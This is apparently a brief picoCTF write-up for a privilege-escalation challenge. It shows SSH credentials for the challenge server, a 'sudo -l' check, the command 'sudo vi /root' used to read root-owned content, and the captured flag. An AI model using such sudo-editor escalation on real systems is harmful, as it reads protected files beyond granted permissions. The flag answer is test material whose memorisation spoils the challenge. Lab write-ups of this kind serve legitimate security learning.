#### Description

Can you read files in the root file?Additional details will be available after launching your challenge instance.

````
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 49702 picoplayer@saturn.picoctf.net`Password: `33qE7mB5BF`Can you login and read the root file?
`````



````
```
picoplayer@challenge:/$ sudo -l
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
picoplayer@challenge:/$ sudo vi /root

picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```